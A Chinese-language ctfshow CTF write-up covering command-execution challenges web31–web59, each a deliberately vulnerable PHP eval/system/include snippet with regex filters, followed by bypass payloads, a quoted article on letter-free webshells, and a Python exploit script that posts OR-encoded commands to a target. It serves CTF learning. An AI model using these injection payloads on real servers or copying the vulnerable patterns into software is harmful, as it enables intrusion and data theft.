# 命令执行

## web31

```php
 <?php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

又过滤了 . 和空格、cat，用重造变量的方法

```php
?c=eval($_GET[1]);&1=echo `tac flag.php`;
官方POC：
利用已知的其他函数来凑出所需要的字符串来绕过

show_source(next(array_reverse(scandir(pos(localeconv())))));

localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个"."
pos():输出数组第一个元素，不改变指针；
scandir();遍历目录，这里因为参数为"."所以遍历当前目录
array_reverse():元组倒置
next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
show_source():查看源码
```

## web32

```php
 <?php
 
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

这题又过滤了echo，反引号，分号以及单括号，单括号，分号可以用?>绕过，因为PHP最后一条语句不需要分号，单括号过滤的绕过可以使用include替代，之后配合php伪协议读取flag.php源码

```php
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

## web33

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这题依旧可以使用上题的方法

```php
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

## web34

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```php
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

## web35

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```php
?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

## web36

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```php
?c=include$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
```

## web37（data伪协议）

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

```php
?c=data://text/plain,<?php echo `cat fl""ag.php`?>
或
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
```

## web39

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

后面的.php是不需要的，所以直接用#注释掉即可

```php
?c=data://text/plain,<?php echo `cat fla*.php`?>#
或
?c=data://text/plain,<?=`cat fla*.php?>`
<?=是PHP的一个短的开放式标签，是echo()的快捷用法
```

## web40(全局变量)

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

这题可以使用无参数RCE来做

```php
?c=eval(end(current(get_defined_vars())));&key=system('cat flag.php');
利用get_defined_vars()回显全局变量，利用current利用GET方法进行RCE
官方POC：
show_source(next(array_reverse(scandir(pos(localeconv())))));
或者
GXYCTF的禁止套娃 通过cookie获得参数进行命令执行
c=session_start();system(session_id());
passid=ls
```

> 法一
>
> c=eval(array_pop(next(get_defined_vars())));//需要POST传入参数为1=system('tac fl*');
>
> get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。
>
> next()将内部指针指向数组中的下一个元素，并输出。
>
> array_pop() 函数删除数组中的最后一个元素并返回其值。
>
> 法二
>
> c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c=show_source(next(array_reverse(scandir(getcwd()))));
>
> getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())
>
> localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为"."
>
> pos():输出数组第一个元素，不改变指针；
>
> current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样
>
> scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为"."所以遍历当前目录
>
> array_reverse():数组逆置
>
> next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
>
> show_source():查看源码
>
> pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。
>
> 每个数组中都有一个内部的指针指向它的"当前"元素，初始指向插入到数组中的第一个元素。
>
> 提示：该函数不会移动数组内部指针。
>
> 相关的方法：
>
> current()返回数组中的当前元素的值。
>
> end()将内部指针指向数组中的最后一个元素，并输出。
>
> next()将内部指针指向数组中的下一个元素，并输出。
>
> prev()将内部指针指向数组中的上一个元素，并输出。
>
> reset()将内部指针指向数组中的第一个元素，并输出。
>
> each()返回当前元素的键名和键值，并将内部指针向前移动。

## web41（或运算绕过）

```php
<?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}

这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。
我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。
或运算绕过
```

rce_or.php

```php
<?php
$myfile = fopen("rce_or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i'; # 替换这里的正则匹配
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)|urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

大体意思就是`从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符`

exp.py

```py
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
os.system("php rce_or.php")  #没有将php写入环境变量需手动运行
if(len(argv)!=2):
   print("="*50)
   print('USER：python exp.py <url>')
   print("eg：  python exp.py http://ctf.show/")
   print("="*50)
   exit(0)
url=argv[1]
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("rce_or.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))
   data={
       'c':urllib.parse.unquote(param)
       }
   r=requests.post(url,data=data)
   print("\n[*] result:\n"+r.text)
```

![image-20240417223733029](ctfshow%E9%A2%98%E8%A7%A3.assets/image-20240417223733029.png)

![image-20240417223751144](ctfshow%E9%A2%98%E8%A7%A3.assets/image-20240417223751144.png)

## web42（>/dev/null 2>&1绕过）

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

`>/dev/null 2>&1`命令表示不回显

> # [Shell脚本———— /dev/null 2>&1详解](https://www.cnblogs.com/tinywan/p/6025468.html)
>
> **1、可以将/dev/null看作"黑洞". 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.** 
> 用处: 
> 禁止标准输出.  1 cat $filename >/dev/null  # 文件内容丢失，而不会输出到标准输出. 
> 禁止标准错误.   2>/dev/null 这样错误信息[标准错误]就被丢到太平洋去了. 
>
> **2、1>/dev/null 2>&1的含义** 
>
> \> 代表重定向到哪里，例如：echo "123" > /home/123.txt 
> 1 表示stdout标准输出，系统默认值是1，所以">/dev/null"等同于"1>/dev/null" 
> 2 表示stderr标准错误 
> & 表示等同于的意思，2>&1，表示2的输出重定向等同于1 
>
> **那么本文标题的语句：** 
> 1>/dev/null 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。 
> 2>&1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 
>
> 3、/dev/zero文件代表一个永远输出 0的设备文件，使用它作输入可以得到全为空的文件。因此可用来创建新文件和以覆盖的方式清除旧文件。 
>
> 下面使用dd命令将从zero设备中创建一个10K大小（bs决定每次读写1024字节，count定义读写次数为10次），但内容全为0的文件。 
> dd if=/dev/zero of=file count=10 bs=1024
>
>  
>
> shell中可能经常能看到：[>/dev/null 2>&1](http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html) 
>
> 命令的结果可以通过%>的形式来定义输出
>
> 分解这个组合：“>/dev/null 2>&1” 为五部分。
>
> 1：> 代表重定向到哪里，例如：echo "123" > /home/123.txt
> 2：/dev/null 代表空设备文件
> 3：2> 表示stderr标准错误
> 4：& 表示等同于的意思，2>&1，表示2的输出重定向等同于1
> 5：1 表示stdout标准输出，系统默认值是1，所以">/dev/null"等同于 "1>/dev/null"
>
> **因此，>[/dev/null 2>&1](http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html) 也可以写成“1> /dev/null 2> &1”**
>
> **那么本文标题的语句执行过程为：**
> **1>/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。**
> **2>&1 ：接着，标准错误输出重定向 到 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。**
>
> 最常用的方式有：
>
> command > file 2>file 与command > file 2>&1
>
> 它们有什么不同的地方吗？
>    首先command > file 2>file 的意思是将命令所产生的标准输出信息,和错误的输出信息送到file 中.command > file 2>file 这样的写法,stdout和stderr都直接送到file中, file会被打开两次,这样stdout和stderr会互相覆盖,这样写相当使用了FD1和FD2两个同时去抢占file 的管道。
>    而command >file 2>&1 这条命令就将stdout直接送向file, stderr 继承了FD1管道后,再被送往file,此时,file 只被打开了一次,也只使用了一个管道FD1,它包括了stdout和stderr的内容。
>    从IO效率上,前一条命令的效率要比后面一条的命令效率要低,所以在编写shell脚本的时候,较多的时候我们会command > file 2>&1 这样的写法。

要让命令回显，可以进行命令分隔，以此来绕过

```php
;     分号
|     只执行后面那条命令
||    只执行前面那条命令
&     两条命令都会执行
&&    两条命令都会执行
```

```
POC:
1.
?c=cat flag.php ||
2.
?c=cat flag.php%0a
换行
3.
?c=cat flag.php;ls
后面ls不会执行，而前面会被执行
```

## web43

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```php
?c=tac flag.php%0a
```

## web44

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```php
?c=tac fl*%0a
```

## web45

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){ # 多过滤了空格
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);

```

```php
?c=tac%09fla*%0a
# %09是tab键
?c=tac$IFS$9fla*%0a
```

## web46

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```php
?c=tac<fla''g.php||
$和数字都被搬，使用<来进行替代
```

## web47

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```php
?c=tac<fla""g.php||
```

## web48

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```php
?c=tac<fla""g.php||
```

## web49

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```php
?c=tac<fla""g.php||
```

## web50

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```php
?c=tac<fla""g.php||
```

## web51

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```php
?c=nl<fla""g.php||
```

## web52

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```php
?c=nl$IFS/fla''g||
```

## web53

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

```php
?c=ca''t${IFS}fl''ag.php
```

## web54（.*类尽可能匹配）

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

```php
正则加入了.*尽可能多匹配，flag绕过方式就不可以了，但是可以用?来替代，|.*f.*l.*a.*g.*| 这种过滤就是字母不能按过滤的顺序出现

比如说cat，.*当出现cat这个整体时才会进行匹配，会尽可能匹配较多字符，ca，c之类的字符不会进行匹配，tac为什么不能用t??,是因为还有一个跟它一样长度的命令top
```

```php
POC1:
?c=/bin/?at${IFS}f???.php
POC2:
?c=vi${IFS}f???.php

Linux 的很多命令存放在 /bin/ 目录下，且可以通过绝对路径来使用，而且支持通配符。

如 cat 命令也可这样使用：/bin/?at
```

## web55（无字母）

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

```php
1.
改题过滤了字母，但是没有过滤数字，可以尝试使用/bin目录下的可执行程序
?c=/bin/base64 flag.php //以base64形式输出文件内容
替换后变成
?c=/???/????64 ????????
2.
使用
$'\154\163'
会执行ls
故payload是
/?c=$'\143\141\164'%20*
3.
?c=/???/???/????2 ????.???
即/usr/bin/bzip2 flag.php
把flag.php给压缩，然后访问url+flag.php.bz2就可以把压缩后的flag.php给下载下来。
```

## web56（无字母数字，非自增、异或、取反）

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

> [无字母数字且无法使用自增、异或、取反](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
>
> ```php
> <?php
> if(isset($_GET['code'])){
>     $code = $_GET['code'];
>     if(strlen($code)>35){
>         die("Long.");
>     }
>     if(preg_match("/[A-Za-z0-9_$]+/",$code)){
>         die("NO.");
>     }
>     eval($code);
> }else{
>     highlight_file(__FILE__);
> }
> ```
>
> 这个代码如果要getshell，怎样利用？
>
> 这题可能来自是我曾写过的一篇文章：《[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)》，里面介绍了如何构造无字母数字的webshell。其中有两个主要的思路：
>
> 1. 利用位运算
> 2. 利用自增运算符
>
> 当然，这道题多了两个限制：
>
> 1. webshell长度不超过35位
> 2. 除了不包含字母数字，还不能包含`$`和`_`
>
> 难点呼之欲出了，我前面文章中给出的所有方法，都用到了PHP中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为`$`不能使用了，所以我们无法构造PHP中的变量。
>
> 所以，如何解决这个问题？
>
> ### PHP7 下简单解决问题
>
> 我们将上述代码放在index.php中，然后执行`docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:7.2-apache`，启动一个php 7.2的服务器。
>
> php7中修改了表达式执行的顺序：http://php.net/manual/zh/migration70.incompatible.php ：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af.png)](https://www.leavesongs.com/media/attachment/2018/10/06/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.png)
>
> PHP7前是不允许用`($a)();`这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过`('phpinfo')();`来执行函数，第一个括号中可以是任意PHP表达式。
>
> 所以很简单了，构造一个可以生成`phpinfo`这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：
>
> ```
> (~%8F%97%8F%96%91%99%90)();
> ```
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/cdd77556-6aec-425b-85e1-207b8eda77c7.d47ebfeb4011.png)](https://www.leavesongs.com/media/attachment/2018/10/06/cdd77556-6aec-425b-85e1-207b8eda77c7.png)
>
> ### PHP5的思考
>
> 我们使用`docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:5.6-apach`来运行一个php5.6的web环境。
>
> 此时，我们尝试用PHP7的payload，将会得到一个错误：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/a77b35ae-78dd-4fae-b029-8326edeafff4.d1ac6c4a1c4f.png)](https://www.leavesongs.com/media/attachment/2018/10/06/a77b35ae-78dd-4fae-b029-8326edeafff4.png)
>
> 原因就是php5并不支持这种表达方式。
>
> 在我在知识星球里发出帖子的时候，其实还没想到如何用PHP5解决问题，但我有自信解决它，所以先发了这个小挑战。后来关上电脑仔细想想，发现当思路禁锢在一个点的时候，你将会钻进牛角尖；当你用大局观来看待问题，问题就迎刃而解。
>
> 当然，我觉得我的方法应该不是唯一的，不过一直没人出来公布答案，我就先抛钻引玉了。
>
> 大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。
>
> PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？
>
> ### PHP5+shell打破禁锢
>
> 因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、`$`的系统命令来getshell？
>
> 好像问题又回到了原点：无字母、数字、`$`，在shell中仍然是一个难题。
>
> 此时我想到了两个有趣的Linux shell知识点：
>
> 1. shell下可以利用`.`来执行任意脚本
> 2. Linux文件名支持用glob通配符代替
>
> 第一点曾在《 [小密圈里的那些奇技淫巧](https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html) 》露出过一角，但我没细讲。`.`或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则`. file`的意思就是用bash执行file文件中的命令。
>
> 用`. file`执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用`.`来执行它了吗？
>
> 这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。
>
> 第二个难题接踵而至，执行`. /tmp/phpXXXXXX`，也是有字母的。此时就可以用到Linux下的glob通配符：
>
> - `*`可以代替0个及以上任意字符
> - `?`可以代表1个任意字符
>
> 那么，`/tmp/phpXXXXXX`就可以表示为`/*/?????????`或`/???/?????????`。
>
> 但我们尝试执行`. /???/?????????`，却得到如下错误：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png)](https://www.leavesongs.com/media/attachment/2018/10/06/19ba62d6-9f8a-40a6-a3f9-833deca218d5.png)
>
> 这是因为，能够匹配上`/???/?????????`这个通配符的文件有很多，我们可以列出来：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png)](https://www.leavesongs.com/media/attachment/2018/10/06/67a4aab1-9e90-43e6-b3f1-3569c7009390.png)
>
> 可见，我们要执行的`/tmp/phpcjggLC`排在倒数第二位。然而，在执行第一个匹配上的文件（即`/bin/run-parts`）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。
>
> 思路又陷入了僵局，虽然方向没错。
>
> ### 深入理解glob通配符
>
> 大部分同学对于通配符，可能知道的都只有`*`和`?`。但实际上，阅读Linux的文档（ http://man7.org/linux/man-pages/man7/glob.7.html ），可以学到更多有趣的知识点。
>
> 其中，glob支持用`[^x]`的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉`/bin/run-parts`：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png)](https://www.leavesongs.com/media/attachment/2018/10/06/0a5b0800-1a01-4738-831f-f597795255e0.png)
>
> 排除了第4个字符是`-`的文件，同样我们可以排除包含`.`的文件：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png)](https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.png)
>
> 现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。
>
> 继续阅读glob的帮助，我发现另一个有趣的用法：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png)](https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.png)
>
> 就跟正则表达式类似，glob支持利用`[0-9]`来表示一个范围。
>
> 我们再来看看之前列出可能干扰我们的文件：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png)](https://www.leavesongs.com/media/attachment/2018/10/06/ee9e5ae9-3937-46a3-8d8e-1f4879913801.png)
>
> 所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。
>
> 翻开ascii码表，可见大写字母位于`@`与`[`之间：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png)](https://www.leavesongs.com/media/attachment/2018/10/06/a827f363-7520-4fe9-aac1-b8ceba21a1f3.png)
>
> 那么，我们可以利用`[@-[]`来表示大写字母：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png)](https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.png)
>
> 显然这一招是管用的。
>
> ### 构造POC，执行任意命令
>
> 当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。
>
> 最后，我传入的code为`?><?=`. /???/????????[@-[]`;?>`，发送数据包如下：
>
> [![image.png](ctfshow%E9%A2%98%E8%A7%A3.assets/56de7887-0a22-4b06-9ccd-2951a4bdab4c.624e7ada5f87.png)](https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.png)
>
> 成功执行任意命令。

开始做题

首先，我们需要构造一个post上传文件的数据包

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

上传一个1.txt，用bp抓包

![image-20240420160230662](ctfshow%E9%A2%98%E8%A7%A3.assets/image-20240420160230662.png)

构造poc执行命令，然后在上传文件内容添加sh命令

![image-20240420160900703](ctfshow%E9%A2%98%E8%A7%A3.assets/image-20240420160900703.png)

直接读取flag.php

![image-20240420160938119](ctfshow%E9%A2%98%E8%A7%A3.assets/image-20240420160938119.png)

## web57（上题基础过滤.和?）

```php
<?php
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

过滤了.和?，无法用上题的方法了，告诉了flag在36.php

这题要使用$(())来构造运算

```php
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))



${_} ="" //返回上一次命令
$((${_}))=0
$((~$((${_}))))=-1
```

```php
通过$(())操作构造出36： $(()) ：代表做一次运算，因为里面为空，也表示值为0

$(( ~$(()) )) ：对0作取反运算，值为-1

$(( $((~$(()))) $((~$(()))) ))： -1-1，也就是(-1)+(-1)为-2，所以值为-2

$(( ~$(( $((~$(()))) $((~$(()))) )) )) ：再对-2做一次取反得到1，所以值为1

故我们在$(( ~$(( )) ))里面放37个$((~$(())))，得到-37，取反即可得到36:
```

```py
python脚本:
get_reverse_number = "$((~$(({}))))" # 取反操作
negative_one = "$((~$(())))"		# -1
payload = get_reverse_number.format(negative_one*37)
print(payload)
```

## web58

```php
<?php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

```php
这题system，反引号等执行命令函数无法使用，那么就利用show_source或highlight_file来绕过，或者使用include
```

```php
c=include($_POST[1]);&1=php://filter/convert.base64-encode/resource=flag.php
c=highlight_file('flag.php');
c=show_source('flag.php');
```

## web59

```php
<?php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
